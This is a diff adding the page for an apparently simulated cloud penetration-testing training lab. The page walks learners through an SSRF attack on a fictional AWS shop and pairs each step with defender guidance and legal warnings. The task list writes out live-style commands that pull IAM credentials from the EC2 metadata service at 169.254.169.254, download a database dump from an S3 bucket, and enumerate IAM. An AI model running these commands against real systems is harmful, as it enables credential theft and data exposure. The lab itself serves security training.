@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Security Lab - Bug Hunting Lab 08 | Hexworth Prime</title>
+    <!-- Access control must fire before any content renders -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/LinuxTerminal.js"></script>
+    <style>
+        /* ── Reset & Base ─────────────────────────────────────────── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0508;
+            color: #c4b5d4;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 15% 20%, rgba(147, 51, 234, 0.13) 0%, transparent 50%),
+                radial-gradient(ellipse at 85% 80%, rgba(168, 85, 247, 0.09) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(88, 28, 135, 0.05) 0%, transparent 65%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ── Header ───────────────────────────────────────────────── */
+        .header {
+            background: rgba(10, 5, 15, 0.97);
+            border-bottom: 1px solid rgba(147, 51, 234, 0.25);
+            padding: 14px 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            backdrop-filter: blur(12px);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .back-link {
+            color: #7c3aed;
+            text-decoration: none;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+        .back-link:hover {
+            background: rgba(147, 51, 234, 0.12);
+            border-color: rgba(147, 51, 234, 0.3);
+            color: #a855f7;
+        }
+
+        .header-badge {
+            background: rgba(147, 51, 234, 0.2);
+            color: #c084fc;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.72rem;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            font-weight: 600;
+            border: 1px solid rgba(147, 51, 234, 0.3);
+        }
+
+        .header h1 {
+            font-size: 1.15rem;
+            color: #a855f7;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+
+        .header-score {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: #9ca3af;
+        }
+        .score-value {
+            color: #a855f7;
+            font-weight: 700;
+            font-size: 1.1rem;
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* ── Layout: Terminal + Sidebar ───────────────────────────── */
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 370px;
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        .terminal-panel {
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid rgba(147, 51, 234, 0.2);
+            overflow: hidden;
+        }
+
+        .ethical-warning-banner {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.18), rgba(153, 27, 27, 0.12));
+            border-bottom: 1px solid rgba(220, 38, 38, 0.4);
+            padding: 10px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+        .warning-icon { font-size: 1.1rem; flex-shrink: 0; }
+        .warning-text { font-size: 0.78rem; color: #fca5a5; line-height: 1.4; }
+        .warning-text strong { color: #ef4444; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
+
+        .task-prompt {
+            background: rgba(0, 0, 0, 0.35);
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(147, 51, 234, 0.15);
+            flex-shrink: 0;
+        }
+        .task-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .task-number {
+            background: #9333ea;
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.82rem;
+            flex-shrink: 0;
+        }
+        .task-number.completed { background: #22c55e; }
+        .task-number.skipped   { background: #f59e0b; }
+
+        .task-meta { font-size: 0.8rem; color: #6b7280; }
+        .task-meta span { color: #9ca3af; }
+
+        .task-question { font-size: 0.97rem; color: #e5e7eb; line-height: 1.55; }
+        .task-question code {
+            background: rgba(147, 51, 234, 0.2);
+            padding: 1px 7px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #c084fc;
+            font-size: 0.9em;
+        }
+
+        .task-hint { font-size: 0.82rem; color: #6b7280; margin-top: 6px; font-style: italic; display: none; }
+        .task-hint.show { display: block; color: #f59e0b; }
+        .task-hint::before { content: 'Hint: '; font-weight: 600; }
+
+        .terminal-container { flex: 1; min-height: 0; }
+
+        .feedback-bar {
+            background: rgba(0, 0, 0, 0.45);
+            padding: 11px 24px;
+            border-top: 1px solid rgba(147, 51, 234, 0.15);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            flex-shrink: 0;
+        }
+        .feedback-message { font-size: 0.85rem; color: #6b7280; flex: 1; min-width: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .feedback-message.success { color: #22c55e; }
+        .feedback-message.error   { color: #ef4444; }
+
+        .bar-actions { display: flex; gap: 8px; flex-shrink: 0; }
+        .hint-btn, .skip-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .hint-btn { color: #6b7280; }
+        .hint-btn:hover { background: rgba(147, 51, 234, 0.1); border-color: rgba(147, 51, 234, 0.3); color: #a855f7; }
+        .skip-btn { color: #6b7280; }
+        .skip-btn:hover { background: rgba(245, 158, 11, 0.1); border-color: rgba(245, 158, 11, 0.3); color: #f59e0b; }
+        .hint-btn:disabled, .skip-btn:disabled { opacity: 0.3; cursor: not-allowed; }
+
+        /* ── Right: Sidebar ───────────────────────────────────────── */
+        .sidebar {
+            background: rgba(8, 4, 14, 0.97);
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .sidebar-section-title {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: #7c3aed;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(147, 51, 234, 0.2);
+        }
+
+        .mission-brief {
+            background: rgba(147, 51, 234, 0.07);
+            border-left: 3px solid #9333ea;
+            padding: 10px 14px;
+            border-radius: 0 8px 8px 0;
+        }
+        .mission-brief p { font-size: 0.8rem; color: #9ca3af; line-height: 1.55; }
+        .mission-brief strong { color: #c084fc; }
+
+        .sidebar-warning {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.12), rgba(153, 27, 27, 0.08));
+            border: 1px solid rgba(220, 38, 38, 0.35);
+            border-radius: 8px;
+            padding: 11px 14px;
+        }
+        .sidebar-warning-label { font-size: 0.68rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: #ef4444; margin-bottom: 5px; }
+        .sidebar-warning-text { font-size: 0.77rem; color: #fca5a5; line-height: 1.45; }
+
+        .progress-section {}
+        .progress-bar-track { background: rgba(255, 255, 255, 0.08); border-radius: 6px; height: 7px; overflow: hidden; margin: 10px 0 7px; }
+        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); border-radius: 6px; transition: width 0.5s ease; width: 0%; }
+        .progress-stats { display: flex; justify-content: space-between; font-size: 0.8rem; color: #6b7280; margin-bottom: 14px; }
+        .progress-stats .pct { color: #a855f7; font-weight: 600; }
+
+        .objectives-list { list-style: none; display: flex; flex-direction: column; gap: 5px; }
+        .obj-item {
+            display: flex; align-items: flex-start; gap: 9px; padding: 8px 10px; border-radius: 7px;
+            background: rgba(255, 255, 255, 0.02); border-left: 3px solid #1f2937;
+            font-size: 0.77rem; color: #6b7280; transition: all 0.25s ease; line-height: 1.4;
+        }
+        .obj-item.active { border-left-color: #9333ea; background: rgba(147, 51, 234, 0.1); color: #e5e7eb; }
+        .obj-item.completed { border-left-color: #22c55e; color: #4ade80; }
+        .obj-item.skipped { border-left-color: #f59e0b; color: #f59e0b; opacity: 0.65; }
+
+        .obj-check {
+            width: 18px; height: 18px; border: 2px solid #1f2937; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.58rem; flex-shrink: 0; margin-top: 1px;
+        }
+        .obj-item.active    .obj-check { border-color: #9333ea; }
+        .obj-item.completed .obj-check { border-color: #22c55e; background: #22c55e; color: #000; }
+        .obj-item.skipped   .obj-check { border-color: #f59e0b; background: #f59e0b; color: #000; }
+
+        .defender-box {
+            background: rgba(59, 130, 246, 0.07);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            border-radius: 8px; padding: 10px 13px; display: none;
+        }
+        .defender-box.show { display: block; }
+        .defender-box-title { font-size: 0.67rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: #3b82f6; margin-bottom: 4px; }
+        .defender-box-text { font-size: 0.77rem; color: #93c5fd; line-height: 1.45; }
+
+        .score-widget {
+            background: rgba(147, 51, 234, 0.06);
+            border: 1px solid rgba(147, 51, 234, 0.2);
+            border-radius: 8px; padding: 12px 14px;
+        }
+        .score-row { display: flex; justify-content: space-between; font-size: 0.8rem; color: #6b7280; padding: 3px 0; }
+        .score-row .val { color: #c4b5d4; font-weight: 600; font-variant-numeric: tabular-nums; }
+        .score-row.total { border-top: 1px solid rgba(147, 51, 234, 0.2); margin-top: 6px; padding-top: 8px; color: #a855f7; font-weight: 700; }
+        .score-row.total .val { color: #a855f7; font-size: 1.05rem; }
+
+        /* ── Completion Modal ──────────────────────────────────────── */
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.92); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-overlay.show { display: flex; }
+
+        .modal {
+            background: linear-gradient(145deg, #0d0814, #150b20);
+            border: 2px solid #9333ea; border-radius: 18px; padding: 44px 48px;
+            text-align: center; max-width: 520px; width: 90%;
+            box-shadow: 0 0 60px rgba(147, 51, 234, 0.3); animation: modalIn 0.35s ease;
+        }
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.92) translateY(16px); }
+            to   { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .modal.perfect { border-color: #22c55e; box-shadow: 0 0 60px rgba(34, 197, 94, 0.25); }
+
+        .modal-icon { font-size: 3.6rem; margin-bottom: 14px; }
+        .modal h2 { color: #a855f7; font-size: 1.65rem; margin-bottom: 8px; }
+        .modal.perfect h2 { color: #22c55e; }
+        .modal p { color: #6b7280; font-size: 0.9rem; margin-bottom: 22px; line-height: 1.5; }
+
+        .modal-stats { display: flex; justify-content: center; gap: 36px; margin-bottom: 28px; }
+        .modal-stat { text-align: center; }
+        .modal-stat-value { font-size: 2.2rem; font-weight: 700; color: #fff; font-variant-numeric: tabular-nums; }
+        .modal-stat-value.good  { color: #22c55e; }
+        .modal-stat-value.warn  { color: #f59e0b; }
+        .modal-stat-value.pts   { color: #a855f7; }
+        .modal-stat-label { font-size: 0.82rem; color: #6b7280; margin-top: 4px; }
+
+        .modal-btns { display: flex; gap: 14px; justify-content: center; }
+        .modal-btn {
+            padding: 11px 26px; border: none; border-radius: 8px; cursor: pointer;
+            font-size: 0.9rem; font-weight: 600; text-decoration: none;
+            display: inline-block; transition: all 0.2s ease;
+        }
+        .modal-btn.primary { background: linear-gradient(135deg, #9333ea, #a855f7); color: #fff; }
+        .modal-btn.primary:hover { opacity: 0.88; }
+        .modal-btn.secondary { background: rgba(255, 255, 255, 0.07); color: #c4b5d4; border: 1px solid rgba(255, 255, 255, 0.15); }
+        .modal-btn.secondary:hover { background: rgba(255, 255, 255, 0.12); }
+
+        @media (max-width: 960px) {
+            .main-container { grid-template-columns: 1fr; }
+            .sidebar { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="header-left">
+            <a href="../index.html" class="back-link">&larr; Bug Hunting Hub</a>
+            <span class="header-badge">Lab 08</span>
+            <h1>Cloud Security</h1>
+        </div>
+        <div class="header-score">
+            Score: <span class="score-value" id="headerScore">100</span>
+        </div>
+    </header>
+
+    <div class="main-container">
+
+        <section class="terminal-panel">
+
+            <div class="ethical-warning-banner">
+                <span class="warning-icon">&#9888;</span>
+                <p class="warning-text">
+                    <strong>Authorized Testing Only.</strong>
+                    Unauthorized access to AWS resources, S3 buckets, or instance metadata services violates the CFAA (18 U.S.C. 1030) and AWS Acceptable Use Policy. This simulation runs against the authorized ShopZone staging environment only.
+                </p>
+            </div>
+
+            <div class="task-prompt">
+                <div class="task-header">
+                    <div style="display:flex;align-items:center;gap:10px;">
+                        <div class="task-number" id="taskNumber">1</div>
+                        <div class="task-question" id="taskQuestion">Loading...</div>
+                    </div>
+                    <span class="task-meta">Objective <span id="currentTaskNum">1</span> of <span id="totalTasks">8</span></span>
+                </div>
+                <div class="task-hint" id="taskHint"></div>
+            </div>
+
+            <div class="terminal-container" id="terminal"></div>
+
+            <div class="feedback-bar">
+                <div class="feedback-message" id="feedbackMessage">Type a command to begin. Try <code style="background:rgba(147,51,234,0.2);padding:1px 5px;border-radius:3px;color:#c084fc;">help</code> or <code style="background:rgba(147,51,234,0.2);padding:1px 5px;border-radius:3px;color:#c084fc;">objectives</code></div>
+                <div class="bar-actions">
+                    <button class="hint-btn" id="hintBtn" onclick="showHint()">Hint (-5 pts)</button>
+                    <button class="skip-btn" id="skipBtn" onclick="skipTask()">Skip</button>
+                </div>
+            </div>
+        </section>
+
+        <aside class="sidebar">
+
+            <div>
+                <div class="sidebar-section-title">Mission Brief</div>
+                <div class="mission-brief">
+                    <p>
+                        You have discovered a web application at <strong>ShopZone</strong> running on
+                        AWS EC2 that is vulnerable to SSRF. Your objective is to exploit this to
+                        access the EC2 instance metadata service, extract IAM role credentials,
+                        enumerate S3 buckets, and identify overprivileged IAM policies. This
+                        simulates a real-world cloud penetration test scenario.
+                    </p>
+                </div>
+            </div>
+
+            <div class="sidebar-warning">
+                <div class="sidebar-warning-label">Legal Warning</div>
+                <div class="sidebar-warning-text">
+                    Unauthorized access to cloud infrastructure violates the CFAA and cloud
+                    provider terms of service. SSRF to metadata endpoints, credential extraction,
+                    and IAM enumeration require explicit written authorization. This lab is
+                    fully simulated and isolated.
+                </div>
+            </div>
+
+            <div class="progress-section">
+                <div class="sidebar-section-title">Progress</div>
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-stats">
+                    <span><span id="completedCount">0</span> / 8 objectives</span>
+                    <span class="pct" id="progressPct">0%</span>
+                </div>
+            </div>
+
+            <div>
+                <div class="sidebar-section-title">Objectives</div>
+                <ul class="objectives-list" id="objList"></ul>
+            </div>
+
+            <div class="score-widget">
+                <div class="sidebar-section-title" style="margin-bottom:8px;">Score</div>
+                <div class="score-row"><span>Base</span><span class="val">100 pts</span></div>
+                <div class="score-row"><span>Hints used</span><span class="val" id="scoreHintDeduct">-0 pts</span></div>
+                <div class="score-row total"><span>Total</span><span class="val" id="scoreFinal">100</span></div>
+            </div>
+
+            <div class="defender-box" id="defenderBox">
+                <div class="defender-box-title">Defender's Perspective</div>
+                <div class="defender-box-text" id="defenderText"></div>
+            </div>
+
+        </aside>
+    </div>
+
+    <div class="modal-overlay" id="resultsModal">
+        <div class="modal" id="modalContent">
+            <div class="modal-icon" id="modalIcon">&#127942;</div>
+            <h2 id="modalTitle">Lab Complete!</h2>
+            <p id="modalMessage">Full cloud attack chain demonstrated.</p>
+            <div class="modal-stats">
+                <div class="modal-stat">
+                    <div class="modal-stat-value good" id="modalCompleted">0</div>
+                    <div class="modal-stat-label">Completed</div>
+                </div>
+                <div class="modal-stat">
+                    <div class="modal-stat-value warn" id="modalSkipped">0</div>
+                    <div class="modal-stat-label">Skipped</div>
+                </div>
+                <div class="modal-stat">
+                    <div class="modal-stat-value pts" id="modalScore">100</div>
+                    <div class="modal-stat-label">Points</div>
+                </div>
+            </div>
+            <div class="modal-btns">
+                <button class="modal-btn primary" onclick="restartLab()">Restart Lab</button>
+                <a href="../index.html" class="modal-btn secondary">Back to Bug Hunting Hub</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    /* =================================================================
+       Bug Hunting Lab 08 -- Cloud Security
+       Simulated AWS environment with SSRF, S3, IAM enumeration
+       Uses LinuxTerminal.js with custom command handlers
+    ================================================================= */
+
+    /* ── Simulated AWS environment constants ──────────────────────── */
+    const IAM_ROLE_NAME   = 'ShopZone-WebApp-Role';
+    const ACCESS_KEY      = 'AKIAIOSFODNN7EXAMPLE';
+    const SECRET_KEY      = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
+    const SESSION_TOKEN   = 'FwoGZXIvYXdzEBYaDH...truncated...ExampleToken';
+    const ACCOUNT_ID      = '123456789012';
+    const INSTANCE_ID     = 'i-0a1b2c3d4e5f67890';
+
+    const S3_BUCKETS = [
+        { name: 'shopzone-assets', created: '2024-03-15' },
+        { name: 'shopzone-backups', created: '2024-06-22' },
+        { name: 'shopzone-logs', created: '2024-01-08' },
+        { name: 'shopzone-dev-configs', created: '2025-02-14' }
+    ];
+
+    const BACKUP_BUCKET_FILES = [
+        { date: '2025-11-01 02:00:00', size: 45678912, name: 'db-dump.sql' },
+        { date: '2025-11-01 02:01:00', size: 1234567, name: 'user-export.csv' },
+        { date: '2025-10-15 03:00:00', size: 89012345, name: 'full-backup-oct.tar.gz' },
+        { date: '2025-09-01 02:00:00', size: 78901234, name: 'full-backup-sep.tar.gz' }
+    ];
+
+    const IAM_USERS = [
+        { UserName: 'admin-jsmith', UserId: 'AIDAJQABLZS4A3QDU576Q', Arn: `arn:aws:iam::${ACCOUNT_ID}:user/admin-jsmith`, CreateDate: '2024-01-15T10:00:00Z' },
+        { UserName: 'dev-mwilson', UserId: 'AIDAJQABLZS4B4RE7789R', Arn: `arn:aws:iam::${ACCOUNT_ID}:user/dev-mwilson`, CreateDate: '2024-03-22T14:30:00Z' },
+        { UserName: 'svc-deployment', UserId: 'AIDAJQABLZS4C5SF8890S', Arn: `arn:aws:iam::${ACCOUNT_ID}:user/svc-deployment`, CreateDate: '2024-06-10T08:15:00Z' },
+        { UserName: 'intern-temp', UserId: 'AIDAJQABLZS4D6TG9901T', Arn: `arn:aws:iam::${ACCOUNT_ID}:user/intern-temp`, CreateDate: '2025-09-01T09:00:00Z' }
+    ];
+
+    const IAM_POLICIES = [
+        { PolicyName: 'ShopZone-AdminFullAccess', PolicyId: 'ANPAJ2UCCR6DPCEXAMPLE', Arn: `arn:aws:iam::${ACCOUNT_ID}:policy/ShopZone-AdminFullAccess`, AttachmentCount: 2, DefaultVersionId: 'v1' },
+        { PolicyName: 'ShopZone-S3ReadWrite', PolicyId: 'ANPAJ2UCCR6DPCEXAMPL2', Arn: `arn:aws:iam::${ACCOUNT_ID}:policy/ShopZone-S3ReadWrite`, AttachmentCount: 3, DefaultVersionId: 'v2' },
+        { PolicyName: 'ShopZone-DevOps-Overpriv', PolicyId: 'ANPAJ2UCCR6DPCEXAMPL3', Arn: `arn:aws:iam::${ACCOUNT_ID}:policy/ShopZone-DevOps-Overpriv`, AttachmentCount: 1, DefaultVersionId: 'v1' }
+    ];
+
+    const OVERPRIVILEGED_POLICY = {
+        PolicyName: 'ShopZone-DevOps-Overpriv',
+        PolicyVersion: {
+            Document: {
+                Version: '2012-10-17',
+                Statement: [
+                    {
+                        Effect: 'Allow',
+                        Action: '*',
+                        Resource: '*'
+                    }
+                ]
+            },
+            VersionId: 'v1',
+            IsDefaultVersion: true
+        },
+        _finding: 'CRITICAL: This policy grants Action: * on Resource: * -- full admin access. Attached to svc-deployment service account.'
+    };
+
+    /* ── Score state ─────────────────────────────────────────────── */
+    const score = { base: 100, hints: 0 };
+
+    /* ── Task definitions ────────────────────────────────────────── */
+    const TASKS = [
+        {
+            id: 1,
+            question: 'Enumerate S3 buckets by listing the public backup bucket with <code>aws s3 ls s3://shopzone-backups</code>',
+            hint: 'aws s3 ls s3://shopzone-backups',
+            validate: c => c.includes('aws') && c.includes('s3') && c.includes('ls') && c.includes('shopzone-backups'),
+            successMessage: 'Public S3 bucket shopzone-backups enumerated. Contains database dumps, user exports, and full backups. The bucket has no access restrictions -- any authenticated AWS principal can list and download its contents. This is a critical data exposure.',
+            defender: 'Enable S3 Block Public Access at the account level. Use bucket policies that explicitly deny public access. Enable S3 access logging and set up CloudTrail alerts for ListBucket and GetObject calls from unknown principals. Regularly audit bucket ACLs with AWS Config rules.'
+        },
+        {
+            id: 2,
+            question: 'Download the database dump from the bucket with <code>aws s3 cp s3://shopzone-backups/db-dump.sql .</code>',
+            hint: 'aws s3 cp s3://shopzone-backups/db-dump.sql .',
+            validate: c => c.includes('aws') && c.includes('s3') && c.includes('cp') && c.includes('db-dump.sql'),
+            successMessage: 'Database dump downloaded successfully (43.5 MB). The file contains the full production database including user credentials, payment records, and PII. Public S3 buckets with database backups are one of the most common and severe cloud misconfigurations found in bug bounty programs.',
+            defender: 'Never store database dumps in S3 without encryption (SSE-S3 or SSE-KMS) and strict bucket policies. Implement lifecycle rules to auto-delete old backups. Use AWS Macie to scan buckets for PII and sensitive data. Database backups should use dedicated, private buckets with MFA Delete enabled.'
+        },
+        {
+            id: 3,
+            question: 'Exploit SSRF to reach the EC2 metadata service with <code>curl http://169.254.169.254/latest/meta-data/</code>',
+            hint: 'curl http://169.254.169.254/latest/meta-data/',
+            validate: c => c.includes('curl') && c.includes('169.254.169.254') && c.includes('meta-data'),
+            successMessage: 'SSRF to EC2 metadata service successful. The instance metadata endpoint at 169.254.169.254 is accessible, exposing instance identity, network configuration, and IAM role credentials. IMDSv1 (no token required) is enabled, making this exploitable via simple GET requests.',
+            defender: 'Enforce IMDSv2 (token-required) on all EC2 instances via instance metadata options. IMDSv2 requires a PUT request to obtain a session token before metadata access, which prevents most SSRF exploitation. Set HttpTokens=required and HttpPutResponseHopLimit=1 in your launch templates.'
+        },
+        {
+            id: 4,
+            question: 'Extract the IAM role name from metadata with <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>',
+            hint: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            validate: c => c.includes('curl') && c.includes('169.254.169.254') && c.includes('iam/security-credentials'),
+            successMessage: 'IAM role name extracted: ' + IAM_ROLE_NAME + '. The metadata service lists all IAM roles attached to the instance. This role name is needed to retrieve temporary security credentials in the next step.',
+            defender: 'Minimize IAM role permissions attached to EC2 instances. Use the principle of least privilege -- a web application role should only have access to the specific S3 buckets and services it needs. Never attach AdministratorAccess or broad wildcard policies to instance roles.'
+        },
+        {
+            id: 5,
+            question: 'Retrieve temporary credentials for the role with <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' + IAM_ROLE_NAME + '</code>',
+            hint: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' + IAM_ROLE_NAME,
+            validate: c => c.includes('curl') && c.includes('169.254.169.254') && c.includes(IAM_ROLE_NAME),
+            successMessage: 'Temporary AWS credentials extracted. AccessKeyId, SecretAccessKey, and SessionToken for role ' + IAM_ROLE_NAME + ' obtained. These credentials are valid for up to 6 hours and grant whatever permissions the role has. An attacker can now use these outside the instance.',
+            defender: 'IMDSv2 blocks this attack chain. Additionally, use VPC endpoints for AWS services to reduce the need for internet-facing metadata access. Monitor CloudTrail for AssumeRole events and unusual API calls from EC2 instance roles. Set up GuardDuty to detect credential exfiltration patterns.'
+        },
+        {
+            id: 6,
+            question: 'Use the extracted credentials to check identity with <code>aws sts get-caller-identity</code>',
+            hint: 'aws sts get-caller-identity',
+            validate: c => c.includes('aws') && c.includes('sts') && c.includes('get-caller-identity'),
+            successMessage: 'Identity confirmed: assumed-role/' + IAM_ROLE_NAME + ' in account ' + ACCOUNT_ID + '. The extracted credentials are valid and grant the full permissions of the EC2 instance role. This confirms lateral movement from SSRF to authenticated AWS API access.',
+            defender: 'Monitor for sts:GetCallerIdentity calls from IP addresses outside your known EC2 CIDR ranges. This API call is often the first thing an attacker runs after extracting credentials. Set up CloudTrail alerts for credential use from unexpected source IPs.'
+        },
+        {
+            id: 7,
+            question: 'List IAM users with the escalated credentials with <code>aws iam list-users</code>',
+            hint: 'aws iam list-users',
+            validate: c => c.includes('aws') && c.includes('iam') && c.includes('list-users'),
+            successMessage: 'IAM user enumeration successful. Four users discovered including admin-jsmith, dev-mwilson, svc-deployment (service account), and intern-temp. The instance role has iam:ListUsers permission, which should not be granted to a web application role.',
+            defender: 'Web application roles should never have IAM read permissions (iam:List*, iam:Get*). These permissions enable reconnaissance and privilege escalation. Use Service Control Policies (SCPs) at the organization level to deny IAM enumeration from non-administrative roles.'
+        },
+        {
+            id: 8,
+            question: 'Find the overprivileged IAM policy with <code>aws iam get-policy --policy-arn arn:aws:iam::' + ACCOUNT_ID + ':policy/ShopZone-DevOps-Overpriv</code>',
+            hint: 'aws iam get-policy --policy-arn arn:aws:iam::' + ACCOUNT_ID + ':policy/ShopZone-DevOps-Overpriv',
+            validate: c => c.includes('aws') && c.includes('iam') && c.includes('get-policy') && c.includes('Overpriv'),
+            successMessage: 'CRITICAL finding: ShopZone-DevOps-Overpriv policy grants Action: * on Resource: * (full admin access). This policy is attached to the svc-deployment service account. Any compromise of that account grants complete control over the AWS environment.',
+            defender: 'Never use Action: * / Resource: * in IAM policies. Use IAM Access Analyzer to identify overly permissive policies. Implement permission boundaries on all IAM entities. Run regular IAM credential reports and flag any policy with wildcard permissions. Service accounts should have the most restrictive policies possible.'
+        }
+    ];
+
+    /* ── Lab state ───────────────────────────────────────────────── */
+    const state = {
+        currentTask: 0,
+        results: {},
+        attempts: {},
+        credsExtracted: false,
+        roleNameFound: false
+    };
+
+    /* ── Initialize LinuxTerminal with custom command handlers ───── */
+    function init() {
+        LinuxTerminal.init('BUGHUNT-08', '#terminal', {
+            user: 'researcher',
+            hostname: 'cloudhunt',
+            startDir: '/home/researcher',
+            height: '100%',
+            onCommand: handleCommand,
+            objectives: TASKS.map(t => ({
+                id: `obj${t.id}`,
+                desc: t.question.replace(/<[^>]+>/g, '').substring(0, 52)
+            }))
+        });
+
+        LinuxTerminal.addFilesystem({
+            '/home/researcher': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'researcher', group: 'researcher',
+                children: ['notes.txt', 'scope.txt', '.aws']
+            },
+            '/home/researcher/notes.txt': {
+                type: 'file', perms: '-rw-r--r--', owner: 'researcher', group: 'researcher',
+                size: 512,
+                content: 'Cloud Security Assessment Notes\n================================\nTarget: ShopZone AWS Infrastructure\nScope: S3, EC2 metadata, IAM enumeration\nEntry point: SSRF vulnerability in web application\nMetadata endpoint: http://169.254.169.254/latest/meta-data/\nKnown S3 buckets: shopzone-assets, shopzone-backups, shopzone-logs, shopzone-dev-configs'
+            },
+            '/home/researcher/scope.txt': {
+                type: 'file', perms: '-rw-r--r--', owner: 'researcher', group: 'researcher',
+                size: 256,
+                content: 'Authorized Scope\n=================\nAWS Account: ' + ACCOUNT_ID + '\nS3 Buckets: shopzone-*\nEC2 Instances: i-0a1b2c3d4e5f67890\nIAM: Read-only enumeration permitted\nSSRF: Metadata service exploitation authorized'
+            },
+            '/home/researcher/.aws': {
+                type: 'dir', perms: 'drwx------', owner: 'researcher', group: 'researcher',
+                children: ['credentials', 'config']
+            },
+            '/home/researcher/.aws/credentials': {
+                type: 'file', perms: '-rw-------', owner: 'researcher', group: 'researcher',
+                size: 128,
+                content: '[default]\naws_access_key_id = AKIAIOSFODNN7INITIAL\naws_secret_access_key = initial-key-for-s3-enumeration\nregion = us-east-1'
+            },
+            '/home/researcher/.aws/config': {
+                type: 'file', perms: '-rw-------', owner: 'researcher', group: 'researcher',
+                size: 64,
+                content: '[default]\nregion = us-east-1\noutput = json'
+            }
+        });
+
+        buildObjList();
+        document.getElementById('totalTasks').textContent = TASKS.length;
+        showTask(0);
+
+        LinuxTerminal.print(`<span style="color:#a855f7;">[ Bug Hunting Lab 08: Cloud Security ]</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Target: ShopZone AWS Infrastructure (Account: ${ACCOUNT_ID})</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Entry point: SSRF via web application on EC2</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Type <span style="color:#c084fc;">help</span> for commands or <span style="color:#c084fc;">objectives</span> to list tasks.\n</span>`);
+    }
+
+    /* ── Command handler ──────────────────────────────────────────── */
+    function handleCommand(cmdLine, output, cmd, args) {
+        const c = cmdLine.trim();
+        const t = TASKS[state.currentTask];
+
+        state.attempts[state.currentTask] = (state.attempts[state.currentTask] || 0) + 1;
+
+        /* Built-in passthrough commands */
+        const passthroughs = ['clear', 'help', 'ls', 'cat', 'cd', 'pwd', 'whoami', 'uname', 'man', 'which', 'echo', 'history'];
+        if (passthroughs.includes(cmd)) return;
+
+        if (cmd === 'objectives') {
+            LinuxTerminal.print(`<span style="color:#a855f7;">Lab Objectives:</span>`);
+            TASKS.forEach((task, i) => {
+                const status = state.results[i] === 'correct' ? '<span style="color:#22c55e;">[DONE]</span>' :
+                               state.results[i] === 'skipped' ? '<span style="color:#f59e0b;">[SKIP]</span>' :
